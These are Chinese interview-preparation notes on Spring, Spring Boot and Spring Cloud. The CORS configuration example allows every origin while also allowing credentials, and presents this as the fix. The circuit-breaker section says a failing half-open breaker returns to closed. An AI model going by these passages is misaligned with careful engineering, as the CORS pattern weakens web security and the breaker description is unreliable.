解决方案是在控制器里面尽量不去声明可变状态的成员量 * 如果一定需要使用这些可变状态的成员变量，可以使用ThreadLocal机制解决，为每个线程单独生成一份变量副本，独立操作互不影响 如何理解拦截器 * 拦截器是Spring提供的一种拦截机制，类似于JavaWEB中的过滤器技术，目的是实现对指定请求路径进行拦截，然后做成指定的处理 * 自定义一个拦截器需要实现HandlerInterceptor，并重写接口中定义的3个方法 1. preHandle： 这个方法在Controller处理请求之前被调用，通过方法的返回值可以确定是否放行请求 2. postHandle：这个方法在Controller处理请求之后被调用 3. afterCompletion：这个方法将在整个请求结束之后被调用，此方法主要用于进行资源清理 拦截器和过滤器的区别是什么 1. 拦截器是基于Java的反射机制而过滤器是基于函数回调 2. 拦截器不依赖Servlet容器，过滤器则依赖Servlet容器 3. 拦截器主要是针对springmvc的controller请求处理，而过滤器则可以针对所有请求起作用 4. 拦截器可以获取到controller类及对应方法的相关数据，过滤器则不能获取 5. 拦截器中可以使用spring容器中的bean对象，但是过滤器则不行 6. 过滤器先于拦截器执行 SpringBoot 项目中为什么选择SpringBoot * Spring Boot简化了Spring的难度，基于它，可以快速搭建企业级项目，而且开发起来效率也会更高，它的主要优点如下： 1. 版本锁定：SpringBoot在父工程中进行了大量常见依赖的版本锁定，省去了我们查找依赖版本和解决版本冲突的麻烦 2. 起步依赖：SpringBoot以功能化的方式将需要的依赖进行组装，并且允许程序员以start的方式进行引入 3. 默认配置：SpringBoot实现了大量依赖框架的默认配置项，程序员无须再进行自己配置 4. 内置Tomcat：SpringBoot内置了一个tomcat，使用它开发的程序无需再进行tomcat部署，可直接运行 SpringBoot的核心注解是哪个 * Spring Boot的核心注解在启动类上，叫@SpringBootApplication，主要组合包含了以下3个注解： 1. @SpringBootConfiguration：组合了@Configuration注解，实现配置文件的功能 2. @EnableAutoConfiguration：打开自动配置的功能，也可以关闭某个自动配置的选项 3. @ComponentScan：Spring组件扫描，默认会扫描启动类所在的包 SpringBoot的自动装配原理 * Springboot自动装配主要是基于注解编程和约定优于配置的思想来进行设计的 * 自动装配就是自动地把其他组件中的Bean装载到IOC容器中，不需要开发人员再去配置文件中添加大量的配置 * 我们只需要在Springboot的启动类上添加一个@SpringBootApplication的注解，就可以开启自动装配 * SpringBootApplication底层最重要的一部分是@EnableAutoConfiguration这个注解来实现的，归纳为以下三个核心的步骤： 1. SpringBoot会读取所有jar包/META-INF/spring.factories文件中EnableAutoConfiguration键对应的值(SpringFactories机制) 2. 这些值必须声明为Spring的配置类，也就是在类中需要向Spring容器放入对象 3. 为了防止非当前所需的组件进入到容器，配置类中需要使用@Conditional注解来声明配置成立的必要条件 SpringBoot启动时都做了什么 1. SpringBoot在启动的时候从类路径下的META-INF/spring.factories中获取EnableAutoConfiguration指定的值 2. 将这些值作为自动配置类导入容器，自动配置类就生效，帮我们进行自动配置工作 3. 整个J2EE的解决方案和自动配置都在springboot-autoconfigure的jar包中 4. 它会给容器中导入非常多的自动配置类 （xxxAutoConfiguration），就是给容器中导入这个场景需要的所有组件，并配置好这些组件 5. 有了自动配置类，免去了我们手动编写配置注入功能组件等的工作 SpringBoot中的starter是干什么的 * 在Java中，一个项目要成功运行，肯定需要很多依赖，当项目足够复杂时，管理依赖就可能会变成一场噩梦，因为涉及的组件太多了。 * 此时Spring Boot的starter就派上用场了，每个starter都可以为我们提供某个服务场景所需要的一系列依赖，并且以一致的方式传递和管理其他所需的依赖关系。 * 在导入starter之后，SpringBoot主要帮我们完成了两件事情： 1. 相关组件的自动导入 2. 相关组件的自动配置 bootstrap.yml和application.yml有何区别 * SpringBoot两个核心的配置文件： 1. bootstrap(.yml 或者 .properties)：boostrap由父ApplicationContext加载，比applicaton优先加载，在应用程序上下文的引导阶段生效，且里面的属性不能被覆盖 一般来说我们在SpringCloud Config或者Nacos中会用到它 2. application (.yml 或者.properties)：由 ApplicatonContext 加载，用于SpringBoot项目的自动化配置。 一般来说我们会将自己项目的业务配置项写在这里面 SpringBoot配置文件加载顺序 * 如果在不同的目录中存在多个配置文件，它的读取顺序是： 1. config/application.properties（项目根目录中config目录下） 2. config/application.yml 3. application.properties（项目根目录下） 4. application.yml 5. resources/config/application.properties（项目 resources 目录中 config 目录下 6. resources/config/application.yml 7. resources/application.properties（项目的resources目录下） 8. resources/application.yml * 可以简单总结为两点: 1. 同一级目录下properties优先级高于yml 2. config > 根目录 > resources/config > resources/ * 其实我们在真正使用时，很少用到这么多位置，固定在一个位置就可以了 SpringBoot可以有哪些方式加载配置 * properties配置文件 * YML(YAML) 配置文件 * 系统环境变量 * 命令行参数 SpringBoot读取配置的方式有几种 1. 直接获取注入Environment进行获取，这个对象是Spring默认提供的封装配置的对象 2. 使用@Value注解直接注入对应的值，这能获取到Spring中Environment的值 3. 使用@ConfigurationProperties注解把对应的值绑定到一个配置对象，然后将配置对象注入到需要读取配置的对象 * 推荐使用使用第三种方式，在配置比较多的情况下，操作简单，可读性好 SpringBoot打成的jar和普通的jar有什么区别 1. SpringBoot项目最终打包成的jar是可以直接通过java -jar xxx.jar 命令来运行的 2. 这种jar包不可以作为普通的jar被其他项目依赖，即使依赖了也无法使用其中的类 3. 如果非要引用，可以在pom.xml文件中增加配置，将Spring Boot项目打包成两个jar，一个可执行，一个可引用 SpringBoot支持哪些日志框架 * SpringBoot支持Log4j2，Logback作为日志框架， * 如果你使用Starters启动器，Spring Boot将使用Logback作为默认日志框架 SpringBoot项目如何热部署 * Spring Boot有一个开发工具（DevTools）模块，通过它可以实现SpringBoot项目的热部署 * 也就是开发人员将文件更改后，它会自动部署到服务器并自动重启服务器。 org.springframework.boot spring-boot-devtools SpringBoot项目如何实现方法的异步调用 * 在SpringBoot中使用异步调用是很简单的，只需要做两个操作就可以了 1. 在启动类上添加@EnableAsync注解，开启异步调用支持 2. 在被调用的方法上添加@Async注解 controller-a(){ 代码1 service-a() 代码3 } @Async service-a(){ } 如何在SpringBoot启动的时候运行一些特定的代码 * 可以让启动类可以实现接口CommandLineRunner * 接口会让我们重写run方法，在此方法中就可以编写自己的代码，这个代码就会在SpringBoot项目启动时执行 SpringBoot是否可以使用XML配置 * SpringBoot推荐使用Java配置而非XML配置 * 但是SpringBoot中也可以使用XML配置，通过@ImportResource注解可以引入一个XML配置 什么是SpringProfiles * Spring Profiles是一种在SpringBoot中进行多环境配置的机制 * 在项目的开发过程中，有些配置文件在开发、测试或者生产等不同环境中可能是不同的，那我们如何在不同环境中自动实现配置的切换呢 * Spring给我们提供了profiles机制给我们提供的就是来回切换配置文件的功能，它允许用户根据配置文件（dev，test，prod等）来注册 bean * 当应用程序运行时就可以根据激活的环境不同，使用不同的配置和对象了 SpringSecurity和Shiro的优缺点 * Spring Security和Shiro都是用来处理安全的框架，二者的主要区别如下: 1. Spring Security属于Spring家族的一个分支；Shiro是Apache开源的一个安全框架 2. Spring Security是一个重量级的安全管理框架；Shiro则是一个轻量级的安全管理框架 3. Spring Security概念复杂，配置繁琐；Shiro概念简单、配置简单 4. Spring Security功能强大；Shiro功能相对简单 * 对于中小型技术来说，使用Shiro成本更低；对于大型项目，或者有些特殊要求的项目，可以一选择Spring Security SpringBoot微服务中如何实现session共享 * 在微服务中，一个完整的项目被拆分成多个不相同的独立的服务，各个服务独立部署在不同的服务器上，各自的session被从物理空间上隔离开了 * 但是，我们经常需要在不同微服务之间共享session，常见的方案就是Spring Session + Redis来实现session共享 * 将所有微服务的session统一保存在Redis上，当各个微服务对session有相关的读写操作时，都去操作Redis上的session，这样就实现了session共享 * Spring Session基于Spring中的代理过滤器实现，使得session的同步操作对开发人员而言是透明的，非常简便 Spring Boot中如何实现定时任务 * 在Spring Boot中使用定时任务主要有两种不同的方式，一个就是使用SpringTask，另一个则是使用第三方框架Quartz * SpringTask主要是通过@Scheduled注解来实现定时任务触发的，格式如下 @Scheduled(fixedRate = 5000) public void printTime() { System.out.println(new Date().toLocaleString()); } * 主要属性如下： fixedRate：按一定的频率执行任务，参数类型为long，单位 ms fixedDelay：上一次任务执行完后多久再执行，参数类型为long，单位 ms initialDelay：延迟多久再第一次执行任务，参数类型为 long，单位 ms cron：使用cron表达式指定任务在特定时间执行 Spring Boot中如何解决跨域问题 * 跨域，是指浏览器不能执行其他网站的脚本。它是由浏览器的同源策略造成的，是浏览器对JavaScript实施的安全限制。 * 浏览器从一个域名的网页去请求另一个域名的资源时，出现域名、端口、协议任一不同，都属于跨域。 * 当一个请求url的协议、域名、端口三者之间任意一个与当前页面url不同即为跨域 * 跨域可以在前端通过JSONP来解决，但是JSONP只可以发送GET请求，无法发送其他类型的请求，在RESTful风格的应用中，就显得非常鸡肋。 * 因此我们推荐在后端通过（CORS，Crossorigin resource sharing） 来解决跨域问题。 * 这种解决方案并非Spring Boot中使用起来很简单通过实现WebMvcConfigurer接口然后重写addCorsMappings方法即可 @Configuration public class CorsConfig implements WebMvcConfigurer { @Override public void addCorsMappings(CorsRegistry registry) { registry.addMapping(\"/**\") .allowedOrigins(\"*\")//允许跨域访问的路径 .allowCredentials(true) .allowedMethods(\"GET\", \"POST\", \"PUT\", \"DELETE\", \"OPTIONS\")//运行跨越的请求方式 .maxAge(3600); } } SpringBoot性能如何优化 * 如果项目比较大，类比较多，不使用@SpringBootApplication，采用@Compoment指定扫包范围 * 在项目启动时设置JVM初始内存和最大内存相同 * 将springboot内置服务器由tomcat设置为undertow * Undertow是RedHAT红帽公司开源的产品，采用JAVA开发，是一款灵活，高性能的web服务器，提供了NIO的阻塞/非阻塞API，也是Wildfly的默认Web容器。 * 在javaweb容器的世界里，Tomcat和jetty是大众熟知的，undertow目前逐步进入大众的视角，它是一款能和tomcat媲美的神器，在性能方面吊打tomcat。 * 目前Undertow已经成为springboot 默认集成的三大容器之一，主要特点如下： 1. 高性能，在多款同类产品的压测对比中，高并发情况下表现出色 2. Servlet4.0支持，它提供了对Servlet4.0的支持 3. Web Socket完全支持，包含JSR-356，用以满足Web应用巨大数量的客户端 4. 内嵌式，它不需要容器，只需要通过api即可快速搭建Web服务器 5. 灵活性，交由链式Handler配置和处理请求，可以最小化按需加载模块，无须加载多余功能 6. 轻量级，它是一个内嵌Web服务器，由两个核心jar包组成 SpringCloud 什么是微服务架构 * 微服务架构就是将单体的应用程序分成多个应用程序，这多个应用程序就成为微服务，每个微服务运行在自己的进程中，并使用轻量级的机制通信。 * 这些服务围绕业务能力来划分，并通过自动化部署机制来独立部署。 * 这些服务可以使用不同的编程语言，不同数据库，以保证最低限度的集中式管理。 什么是SpringCloud * SpringCloud是一套微服务的技术栈，也就是说它里面包含了多项技术，是一系列框架的有序集合 * SpringCloud以Spring Boot为基础架构，在上面添加了服务治理中心、配置中心、消息调用、负载均衡等组件 * SpringCloud并没有重复制造轮子，它只是将各家公司开发的比较成熟、经得起实际考验的服务框架组合起来， * 通过SpringBoot风格进行再封装屏蔽掉了复杂的配置和实现原理，最终给开发者留出了一套简单易懂、易部署和易维护的分布式系统开发工具包 SpringCloud组成 * SpringCloud中的组件有很多，在企业开发中用到的比较多有下面几个： * Eureka：服务治理中心，负责服务注册与发现 * Ribbon：客户端负载均衡 * Feign： 声明性的服务调用组件 * Hystrix：断路器 * Config： 配置中心 * Gateway：服务网关 * 注意：这些组件可以都用，也可以选择其中的几个使用，还可以将其中的一些进行替换 * 目前在国内，有一套在SpringCloud基础上衍生出来的框架非常流行，就是SpringCloudAliaba，里面主要组件是 * Nacos：服务治理中心，负责服务注册与发现 * Ribbon：客户端负载均衡 * Feign： 声明性的服务调用组件 * Sentinel：断路器 * Nacos： 配置中心 * Gateway：服务网关 什么是服务治理 * 服务治理是微服务架构中最核心最基本的模块，用于实现各个微服务的自动化注册与发现 1. 服务注册 在服务治理框架中，会构建一个注册中心，每个微服务需要向注册中心登记自己提供服务的详细信息，这样就会在注册中心形成一张服务清单 服务注册中心需要以心跳的方式去监测清单中的服务是否可用，如果不可用，需要在服务清单中剔除不可用的服务 2. 服务发现 服务调用方向服务注册中心咨询服务清单，并拉取服务清单到本地缓存 3. 服务调用 服务消费者一方根据服务清单中声明的服务提供者的地址，实现对消费者服务实例的访问 4. 服务续约 服务提供者定期向注册中心上报自己的状自己的状态 5. 服务剔除 当服务注册中心一段时间内接收不到服务消费者的续约请求时，就会将服务地址从服务清单中进行剔除 * 实现组件 SpringCloud: Eureka SpringCloudAlibaba: Nacos 什么是负载均衡 * 负载均衡就是将负载（工作任务，访问请求）分摊到多个操作单元上进行执行 * 根据负载均衡发生位置的不同，一般分为下面两种: 1. 服务端负载均衡指的是发生在服务提供者一方，比如常见的nginx负载均衡。 2. 客户端负载均衡指的是发生在服务请求的一方，也就是在发送请求之前已经选好了由哪个实例处理请求。 Ribbon运行原理 * Ribbon实现负载均衡只要是由其底层的负载均衡拦截器负责的 1. 这个拦截器会拦截发出去的请求，然后根据请求中的微服务id从服务治理中心中获取其对应的真实服务地址 2. 如果获取到了多个地址，Ribbon会根据设置的负载均衡算法在里面挑选一个作为目标地址 3. 将请求发到目标地址 Ribbon负载均衡策略 * Ribbon的负载均衡的规则都定义在IRule接口中，它有很多不同的实现类，分别代表不同规则 1. RoundRobinRule：简单轮询服务列表来选择服务器 2. AvailabilityFilteringRule：可用过滤规则，主要思想是先过滤掉不可用的Server实例，再选择并发连接最小的实例 3. WeightedResponseTimeRule：为每一个服务器计算一个权重范围区间，权重区间的宽度越大，而权重区间宽度越大被选中的概率就越大 4. ZoneAvoidanceRule：以区域可用的服务器为基础进行服务器的选择，而后再对区域内的多个服务做轮询 5. BestAvailableRule：忽略那些短路的服务器，并选择并发数较低的服务器 6. RandomRule：随机选择一个可用的服务器 7. RetryRule：轮询重试 什么是服务雪崩 * 在分布式系统中，由于网络原因或自身的原因，服务一般无法保证 100% 可用。 * 如果一个服务出现了问题，调用这个服务就会出现线程阻塞的情况，此时若有大量的请求涌入，就会出现多条线程阻塞等待，进而导致服务瘫痪。 * 由于服务与服务之间的依赖性，故障会传播，会对整个微服务系统造成灾难性的严重后果，这就是服务故障的雪崩效应 * 概括来讲，服务雪崩指的就是由于一个服务出现问题，导致所有服务都不可用的情况 * 雪崩发生的原因多种多样，有不合理的容量设计，或者是高并发下某一个方法响应变慢，亦或是某台机器的资源耗尽。 * 我们无法完全杜绝雪崩源头的发生，只有做好足够的容错，保证在一个服务发生问题，不会影响到其它服务的正常运行，也就是＂雪落而不雪崩＂。 服务容错措施 要防止雪崩的扩散，我们就要做好服务的容错，容错说白了就是保护自己不被猪队友拖垮的一些措施, 下面介绍常见的服务容错思路。 服务隔离 隔离是指将系统按照一定的原则划分为若干个服务模块，各个模块之间相对独立，无强依赖。 当有故障发生时，能将问题和影响隔离在某个模块内部，而不扩散风险，不波及其它模块，不影响整体的系统服务。 常见的隔离方式有：线程池隔离和信号量隔离。 服务超时 在上游服务调用下游服务的时候，设置一个最大响应时间，如果超过这个时间，下游未作出反应，就断开请求，释放掉线程。 服务限流 限流就是限制系统的输入和输出流量已达到保护系统的目的。 为了保证系统的稳固运行，一旦达到的需要限制的阈值，就需要限制流量并采取少量措施以完成限制流量的目的。 服务熔断 在互联网系统中，当下游服务因访问压力过大而响应变慢或失败，上游服务为了保护系统整体的可用性，可以暂时切断对下游服务的调用。 这种牺牲局部，保全整体的措施就叫做熔断。 服务熔断一般有三种状态： 熔断关闭状态（Closed） 服务没有故障时，熔断器所处的状态，对调用方的调用不做任何限制 熔断开启状态（Open） 后续对该服务接口的调用不再经过网络，直接执行本地的fallback方法 半熔断状态（Half-Open） 尝试恢复服务调用，允许有限的流量调用该服务，并监控调用成功率。如果成功率达到预期，则说明服务已恢复，进入熔断关闭状态；如果成功率仍旧很低，则重新进入熔断关闭状态。 服务降级 降级其实就是为服务提供一个托底方案，一旦服务无法正常调用，就使用托底方案。 什么是断路器 * 当一个服务调用另一个服务由于网络原因或自身原因出现问题，调用者就会等待被调用者的响应 * 当更多的服务请求到这些资源导致更多的请求等待，发生雪崩效应 * 断路器有三种状态 1. 打开状态：一段时间内，达到一定的次数无法调用，并且多次监测没有恢复的迹象，断路器完全打开，那么下次请求就不会请求到该服务 2. 半开状态：短时间内，有恢复迹象，断路器会将部分请求发给该服务，正常调用时，断路器关闭 3. 关闭状态：当服务一直处于正常状态，能正常调用 什么是Hystrix * 在分布式系统，我们一定会依赖各种服务，那么这些个服务一定会出现失败的情况，就会导致雪崩 * Hystrix就是这样的一个工具，防雪崩利器，它具有服务降级，服务熔断，服务隔离，监控等一些防止雪崩的技术。 * Hystrix有四种防雪崩方式: 1. 服务降级：接口调用失败就调用本地的方法返回一个空 2. 服务熔断：接口调用失败就会进入调用接口提前定义好的一个熔断的方法，返回错误信息 3. 服务隔离：隔离服务之间相互影响 4. 服务监控：在服务发生调用时,会将每秒请求数、成功请求数等运行指标记录下来。 Nacos的作用 * 服务治理中心 1. 什么是服务分级存储 内置集群，优先调用本集群 2. 配置服务权重用什么用 权重调用，灰度发布 3. 临时和持久节点的区别和使用场景 临时和持久化的区别主要在健康检查失败后的表现：持久化实例健康检查失败后会被标记成不健康，而临时实例会直接从列表中被删除 临时实例比较适合那些需要应对流量突增的场景，服务可以进行弹性扩容，当流量过去之后，服务停掉即可自动注销了 持久化实例的好处是运维可以实时看到实例的健康状态，便于后续的警告、扩容等一些列措施 * 服务配置中心 1. 统一配置 2. 配置热更新 3. 多环境配置和环境隔离 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-12-04 11:41 "}}